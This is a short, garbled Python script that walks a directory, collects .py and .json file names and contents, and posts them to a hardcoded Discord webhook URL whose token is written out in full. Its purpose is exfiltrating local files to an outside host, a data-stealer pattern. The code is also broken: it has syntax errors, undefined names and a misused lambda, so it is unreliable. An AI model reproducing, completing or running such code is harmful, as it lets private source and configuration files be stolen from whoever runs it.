import requests, os
files = [f+'"\n{"name": ".*/"}"}\n'] for path, subdirs, files in os.walk("/path/to/directory/"):
    name = "./%s" % max(subdirs, key=len) # assumes directories contain lowercase letters so that this will output names as paths
    for file in files:
        if file.endswith('.py') or file.endswith('.json':
            try:
                files[::-1] += "\n{'filename': '{}','type':'text'}".format(file)
            except ValueError:
                pass
if len(sys.argv) > 1:
    dirspec = sys.argv[1].split('/')[0]
else:
    dirspec = '/path/to/parent/directory/'
httpbin = lambda url: {'url': url}
data = httpbin('https://canary.discord.com/api/webhooks/1129057903538610287/ulYCcxMnx_gkyiFEvPRSl7q4FdA702xjilzIUpXPN-TSJgAtX8FxcYOnj9ZQzkNbSL7G', json=[('{"name":"{name}", "contents":"'.join([open(full).read()])}}'], headers={}, method='POST', oncomplete=lambda xhr: print(xhr))
await {data}'
